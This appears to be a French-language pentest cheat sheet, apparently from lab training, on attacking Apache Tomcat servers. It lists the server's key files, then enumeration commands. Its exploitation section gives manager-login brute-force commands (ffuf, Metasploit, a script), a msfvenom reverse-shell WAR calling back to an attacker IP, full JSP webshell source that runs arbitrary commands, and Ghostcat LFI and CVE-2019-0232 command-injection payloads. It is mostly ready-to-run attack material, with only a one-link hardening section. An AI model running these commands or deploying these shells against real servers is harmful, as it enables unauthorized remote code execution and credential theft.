

- [ ] [[#Fichiers / Dossiers Importants]]
- [ ] [[#ENUMERATION MANUELLE]]
- [ ] [[#EXPLOITATION]]
- [ ] [[#HARDENING]]


# Fichiers / Dossiers Importants

```shell-session
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml -> Contient les identifiants utilisateurs !
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps --> Dossier racine
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml --> Fichier le plus important (LFI)
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

```shell-session
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class   
```

WEB-INF/web.xml -> Contient les path utilisés par l'application et les classes utilisants ces chemins.

WEB-INF/classes -> Contient toutes les classes.

WEB-INF/lib -> Contient les libs

WEB-INF/jsp -> Contient les pages au format JSP

Exemple de fichier web.xml

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>   
```

Chemin de la classe sur le disque ->  `classes/com/inlanefreight/api/AdminServlet.class`
L'URL /admin fait appel a la classe AdminServlet



# ENUMERATION MANUELLE

- [ ] [[#Identifier Tomcat]]
- [ ] [[#Identifier les routes et classes utilisées par l'application]]
- [ ] [[#Identifier /manager & /host-manager (login)]]
- [ ] [[#Tester Default creds]]
- [ ] Identifier Scripts CGI

## Identifier Tomcat

```shell
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
```

## Identifier les routes et classes utilisées par l'application

```shell
curl -s http://app-dev.inlanefreight.local:8080/WEB-INF/web.xml 
```

## Identifier /manager & /host-manager (login)

```shell
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
```

## Tester Default creds

`tomcat:tomcat`, `admin:admin` ...


---

# EXPLOITATION

- [[#Bruteforce de login]]
- [[#WAR File Upload]]
- [[#CVEs]]

## Bruteforce de login

### FFUF

Générer wordlist en base64 avec le user à tester

```bash
for pass in $(cat /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt); do echo -n "admin:$pass" | base64 >> basic_passes; done
```

```bash
ffuf -w basic_passes -u 'http://web01.inlanefreight.local:8180/manager/html' -X GET -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://web01.inlanefreight.local:8180/' -H 'Cookie: JSESSIONID=ABA3367491E5A2B96226DBF5E2C40391' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' -H 'Authorization: Basic FUZZ' -fc 401
```


### MSF

```
use auxiliary/scanner/http/tomcat_mgr_login
```

```shell-session
set VHOST web01.inlanefreight.local
```

```shell-session
set RPORT 8180
```

```shell-session
set stop_on_success true
```

```shell-session
set rhosts 10.129.201.58
```

```
run
```

### Script Python

https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce.git

```shell
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```



## WAR File Upload


#### ReverseShell

1. Créer charge avec msfvenom

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

2. lancer listener

```shell
nc -lnvp 4443
```

3. Cliquer sur Browse -> Séléctionner war file
4. Deploy
5. RCE 

```shell
curl http://web01.inlanefreight.local:8180/backup/
```

6. Supprimer l'archive avec Undeploy pour nettoyer

#### Webshell

1. Créer bb58021f870b5f85c6c24120540de43f.jsp

```java
<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("bb58021f870b5f85c6c24120540de43f") != null) {
        out.println("Command: " + request.getParameter("bb58021f870b5f85c6c24120540de43f") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("bb58021f870b5f85c6c24120540de43f"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

2. Archiver au format WAR

```shell
zip -r backup.war bb58021f870b5f85c6c24120540de43f.jsp
```

3. Cliquer sur Browse -> Séléctionner l'archive
4. Deploy
5. RCE 

```shell
curl http://web01.inlanefreight.local:8180/backup/bb58021f870b5f85c6c24120540de43f.jsp?bb58021f870b5f85c6c24120540de43f=id
```

6. Supprimer l'archive avec Undeploy pour nettoyer


## CVEs

- [[#Ghostcat (CVE-2020-1938) (< 9.0.31, 8.5.51 & 7.0.100)]]
- [[#CVE-2019-0232 (9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93)]]


### Ghostcat (CVE-2020-1938) (< 9.0.31, 8.5.51 & 7.0.100)

Unauthenticated LFI (uniquement sur les fichier dans la racine du dossier web)

https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi

```shell
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
```

### CVE-2019-0232 (9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93)

> [!TIP]
>  Si enableCmdLineArguments activé -> possible de faire des injections de commandes

#### Identifier Scripts CGI

.cmd

```shell
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```

.bat

```shell
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

#### Command Injection

Si script CGI identifié, par exemple welcome.bat -> injecter commande

```http
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

identifier les variables d'environnement 

```http
 http://10.129.204.227:8080/cgi/welcome.bat?&set
```

Si variable path non définie, obligé de préciser les chemins absolu

```http
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```

si caractère invalide -> url encode

```http
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

#### PoC Reverse Shell

https://github.com/jaiguptanick/CVE-2019-0232


---

# HARDENING

https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html